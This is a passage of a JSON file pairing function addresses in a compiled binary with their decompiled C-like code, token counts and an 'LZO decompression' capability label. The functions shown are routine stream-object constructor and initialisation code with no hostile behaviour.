        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049a240(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x527f34;\n    *(in_ECX + 0x3b) = 0;\n    iVar3 = arg_8h[1];\n    in_ECX[0x3a] = 0;\n    in_ECX[1] = iVar3;\n    iVar3 = *arg_8h;\n    in_ECX[0x3c] = 0;\n    iVar3 = *(iVar3 + -0xc);\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    iVar3 = iVar3 + arg_8h;\n    in_ECX[0x1e] = 0x527f48;\n    in_ECX[0x3f] = 0;\n    fcn.004ba340(iVar3);\n    fcn.004bba60(in_ECX + 0x39);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x3a] = uVar2;\n    *(in_ECX + 0x3b) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x75);\n    in_ECX[0x3c] = 0;\n    *(in_ECX + 0xed) = uVar1;\n    arg_8h[1] = 0;\n    *in_ECX = 0x52c14c;\n    in_ECX[0x1e] = 0x52c174;\n    in_ECX[2] = 0x52c160;\n    fcn.00497a20(arg_8h + 3);\n    in_ECX[0x3c] = in_ECX + 3;\n    return;\n}\n",
        "token_count": 488
    },
    "0049a380": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049a380(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x527f34;\n    in_ECX[0x3a] = 0;\n    *(in_ECX + 0x3b) = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x1e] = 0x527f48;\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    in_ECX[2] = 0x527f5c;\n    in_ECX[0x1e] = 0x527f70;\n    fcn.004bbb80(0);\n    *in_ECX = 0x52c14c;\n    in_ECX[0x1e] = 0x52c174;\n    in_ECX[2] = 0x52c160;\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 3);\n    iVar1 = fcn.00496550(arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 398
    },
    "0049a4e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049a4e0(uint *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x527f34;\n    in_ECX[0x3a] = 0;\n    *(in_ECX + 0x3b) = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x1e] = 0x527f48;\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    in_ECX[2] = 0x527f5c;\n    in_ECX[0x1e] = 0x527f70;\n    fcn.004bbb80(0);\n    *in_ECX = 0x52c14c;\n    in_ECX[0x1e] = 0x52c174;\n    in_ECX[2] = 0x52c160;\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 3);\n    iVar1 = fcn.00496550(*arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 402
    },
    "0049a640": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.0049a640(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    *param_1 = 0x527f34;\n    param_1[0x3a] = 0;\n    *(param_1 + 0x3b) = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    param_1[0x3f] = 0;\n    param_1[0x1e] = 0x527f48;\n    param_1[1] = 0;\n    fcn.004bbb80(0);\n    param_1[2] = 0x527f5c;\n    param_1[0x1e] = 0x527f70;\n    fcn.004bbb80(0);\n    *param_1 = 0x52c14c;\n    param_1[0x1e] = 0x52c174;\n    param_1[2] = 0x52c160;\n    fcn.00497b60();\n    fcn.004bbb80(param_1 + 3);\n    return;\n}\n",
        "token_count": 302
    },
    "0049a750": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049a750(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_8h[2];\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[3];\n    in_ECX[1] = arg_ch[1];\n    iVar2 = *(iVar2 + -0xc);\n    iVar4 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.004ba340(iVar4);\n    fcn.004bba60(in_ECX + iVar2 + 0x6c);\n    uVar3 = *(iVar4 + 0x70);\n    *(iVar4 + 0x70) = 0;\n    *(in_ECX + iVar2 + 0x70) = uVar3;\n    *(in_ECX + iVar2 + 0x74) = *(iVar4 + 0x74);\n    uVar1 = *(iVar4 + 0x75);\n    *(in_ECX + iVar2 + 0x78) = 0;\n    *(in_ECX + iVar2 + 0x75) = uVar1;\n    iVar2 = arg_8h[4];\n    arg_ch[1] = 0;\n    in_ECX[2] = iVar2;\n    *(in_ECX + *(iVar2 + -0xc) + 8) = arg_8h[5];\n    iVar2 = arg_8h[1];\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar2 = *arg_8h;\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00497a20(arg_ch + 3);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 3;\n    return;\n}\n",
        "token_count": 552
    },
    "0049a880": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049a880(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.004bbb80(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 3);\n    iVar1 = fcn.00496550(arg_ch, arg_10h);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 404
    },
    "0049a9e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049a9e0(int32_t *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.004bbb80(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 3);\n    iVar1 = fcn.00496550(*arg_ch, arg_10h);\n    if (iVar1 != 0) {\n        fcn.004bbce0(0);\n        return;\n    }\n    fcn.004bbce0(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 408
    },
    "0049ab40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049ab40(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.004bbb80(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.004bbb80(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00497b60();\n    fcn.004bbb80(in_ECX + 3);\n    return;\n}\n",
        "token_count": 318
    },
    "0049b000": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049b000(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *in_ECX = 0x527f84;\n    *(in_ECX + 0x3c) = 0;\n    iVar3 = arg_8h[1];\n    in_ECX[0x3b] = 0;\n    in_ECX[1] = iVar3;\n    iVar3 = *arg_8h;\n    *(in_ECX + 0xf2) = 0;\n    iVar3 = *(iVar3 + -0xc);\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    iVar3 = iVar3 + arg_8h;\n    in_ECX[0x1f] = 0x527f98;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x40] = 0;\n    fcn.004ba340(iVar3);\n    fcn.004bc290(in_ECX + 0x3a);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x3b] = uVar2;\n    *(in_ECX + 0x3c) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x76);\n    in_ECX[0x3d] = 0;\n    *(in_ECX + 0xf2) = uVar1;\n    arg_8h[1] = 0;\n    *in_ECX = 0x52c188;\n    in_ECX[0x1f] = 0x52c1b0;\n    in_ECX[2] = 0x52c19c;\n    fcn.004999f0(arg_8h + 3);\n    in_ECX[0x3d] = in_ECX + 3;\n    return;\n}\n",
        "token_count": 505
    },
    "0049b140": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049b140(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *(in_ECX + 0xf2) = 0;\n    in_ECX[0x3b] = 0;\n    *(in_ECX + 0x3c) = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x40] = 0;\n    *in_ECX = 0x527f84;\n    in_ECX[0x1f] = 0x527f98;\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    in_ECX[2] = 0x527fe8;\n    in_ECX[0x1f] = 0x527ffc;\n    fcn.004bc380(0);\n    *in_ECX = 0x52c188;\n    in_ECX[0x1f] = 0x52c1b0;\n    in_ECX[2] = 0x52c19c;\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 3);\n    iVar1 = fcn.00498500(arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 410
    },
    "0049b2b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049b2b0(uint *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.004bad50();\n    *(in_ECX + 0xf2) = 0;\n    in_ECX[0x3b] = 0;\n    *(in_ECX + 0x3c) = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    in_ECX[0x40] = 0;\n    *in_ECX = 0x527f84;\n    in_ECX[0x1f] = 0x527f98;\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    in_ECX[2] = 0x527fe8;\n    in_ECX[0x1f] = 0x527ffc;\n    fcn.004bc380(0);\n    *in_ECX = 0x52c188;\n    in_ECX[0x1f] = 0x52c1b0;\n    in_ECX[2] = 0x52c19c;\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 3);\n    iVar1 = fcn.00498500(*arg_8h, arg_ch);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 414
    },
    "0049b420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.0049b420(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.004bad50();\n    *(param_1 + 0xf2) = 0;\n    param_1[0x3b] = 0;\n    *(param_1 + 0x3c) = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    param_1[0x3f] = 0;\n    param_1[0x40] = 0;\n    *param_1 = 0x527f84;\n    param_1[0x1f] = 0x527f98;\n    param_1[1] = 0;\n    fcn.004bc380(0);\n    param_1[2] = 0x527fe8;\n    param_1[0x1f] = 0x527ffc;\n    fcn.004bc380(0);\n    *param_1 = 0x52c188;\n    param_1[0x1f] = 0x52c1b0;\n    param_1[2] = 0x52c19c;\n    fcn.00499b30();\n    fcn.004bc380(param_1 + 3);\n    return;\n}\n",
        "token_count": 316
    },
    "0049b530": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049b530(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_8h[2];\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[3];\n    in_ECX[1] = arg_ch[1];\n    iVar3 = *(iVar3 + -0xc);\n    iVar5 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.004ba340(iVar5);\n    fcn.004bc290(in_ECX + iVar3 + 0x6c);\n    uVar4 = *(iVar5 + 0x70);\n    *(iVar5 + 0x70) = 0;\n    *(in_ECX + iVar3 + 0x70) = uVar4;\n    uVar2 = *(iVar5 + 0x74);\n    uVar1 = *(iVar5 + 0x76);\n    *(in_ECX + iVar3 + 0x78) = 0;\n    *(in_ECX + iVar3 + 0x74) = uVar2;\n    *(in_ECX + iVar3 + 0x76) = uVar1;\n    iVar3 = arg_8h[4];\n    arg_ch[1] = 0;\n    in_ECX[2] = iVar3;\n    *(in_ECX + *(iVar3 + -0xc) + 8) = arg_8h[5];\n    iVar3 = arg_8h[1];\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar3 = *arg_8h;\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.004999f0(arg_ch + 3);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 3;\n    return;\n}\n",
        "token_count": 566
    },
    "0049b660": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049b660(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.004bc380(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 3);\n    iVar1 = fcn.00498500(arg_ch, arg_10h);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 402
    },
    "0049b7c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049b7c0(int32_t *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.004bc380(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 3);\n    iVar1 = fcn.00498500(*arg_ch, arg_10h);\n    if (iVar1 != 0) {\n        fcn.004bc500(0);\n        return;\n    }\n    fcn.004bc500(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 406
    },
    "0049b920": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049b920(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[2];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    in_ECX[1] = 0;\n    fcn.004bc380(0);\n    iVar1 = arg_8h[4];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[5];\n    fcn.004bc380(0);\n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[6];\n    in_ECX[2] = arg_8h[7];\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[8];\n    in_ECX[2] = arg_8h[9];\n    fcn.00499b30();\n    fcn.004bc380(in_ECX + 3);\n    return;\n}\n",
        "token_count": 318
    },
    "0049bc30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch_12\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch_2\n// WARNING: Removing unreachable block (ram,0x0049c6e0)\n// WARNING: Removing unreachable block (ram,0x0049c5c0)\n// WARNING: Removing unreachable block (ram,0x0049c4a0)\n// WARNING: Removing unreachable block (ram,0x0049c380)\n// WARNING: Removing unreachable block (ram,0x0049c260)\n// WARNING: Removing unreachable block (ram,0x0049c140)\n// WARNING: Removing unreachable block (ram,0x0049c020)\n// WARNING: Removing unreachable block (ram,0x0049bf00)\n// WARNING: Removing unreachable block (ram,0x0049bde0)\n// WARNING: Removing unreachable block (ram,0x0049bcc0)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.0049bc30(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    ushort uVar2;\n    int16_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int16_t *piVar6;\n    uint32_t uVar7;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *extraout_ECX_03;\n    int32_t *extraout_ECX_04;\n    int32_t *extraout_ECX_05;\n    int32_t *extraout_ECX_06;\n    int32_t *extraout_ECX_07;\n    int32_t *extraout_ECX_08;\n    int32_t *extraout_ECX_09;\n    int32_t *extraout_ECX_10;\n    int32_t iVar8;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    int32_t extraout_EDX_05;\n    int32_t extraout_EDX_06;\n    int32_t extraout_EDX_07;\n    int32_t extraout_EDX_08;\n    int32_t iVar9;\n    ulong uVar10;\n    uint var_8h_11;\n    uint var_1dh;\n    uint var_ch;\n    char cStack989;\n    uint var_1ch_12;\n    int32_t in_stack_fffffc48;\n    int16_t *in_stack_fffffc4c;\n    uint var_ch_12;\n    uint var_8h;\n    char cStack873;\n    uint32_t uStack872;\n    uint uStack856;\n    int32_t iStack852;\n    uint var_1dh_11;\n    uint var_ch_11;\n    uint var_8h_2;\n    uint var_1dh_10;\n    uint var_ch_10;\n    uint var_8h_3;\n    uint var_1dh_9;\n    uint var_ch_9;\n    uint var_8h_4;\n    uint var_1dh_8;\n    uint var_ch_8;\n    uint var_8h_5;\n    uint var_1dh_7;\n    uint var_ch_7;\n    uint var_8h_6;\n    uint var_1dh_6;\n    uint var_ch_6;\n    uint var_8h_7;\n    uint var_1dh_5;\n    uint var_ch_5;\n    uint var_8h_8;\n    uint var_1dh_4;\n    uint var_ch_4;\n    uint var_8h_9;\n    uint var_1dh_3;\n    uint var_ch_3;\n    uint var_8h_10;\n    uint var_1dh_2;\n    uint var_ch_2;\n    \n    fcn.0049dc90();\n    if (var_1dh_2 == '\\0') {\n        return param_1;\n    }\n    piVar5 = *(param_1 + *(*param_1 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x30))();\n        return param_1;\n    }\n    fcn.004bde60();\n    if (extraout_EDX == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*param_1 + -0xc);\n        puVar1 = param_1 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(param_1 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return param_1;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (var_1dh_3 == '\\0') {\n        return extraout_ECX;\n    }\n    piVar5 = *(extraout_ECX + *(*extraout_ECX + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 8))();\n        return extraout_ECX;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_00 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (var_1dh_4 == '\\0') {\n        return extraout_ECX_00;\n    }\n    piVar5 = *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x28))();\n        return extraout_ECX_00;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_01 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_00;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (var_1dh_5 == '\\0') {\n        return extraout_ECX_01;\n    }\n    piVar5 = *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x2c))();\n        return extraout_ECX_01;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_02 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_01;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.0049dc90();\n    if (var_1dh_6 == '\\0') {\n        return extraout_ECX_02;\n    }\n    piVar5 = *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x84);\n    if (piVar5 != NULL) {\n        (**(*piVar5 + 0x24))();\n        return extraout_ECX_02;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_03 == 1) {\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        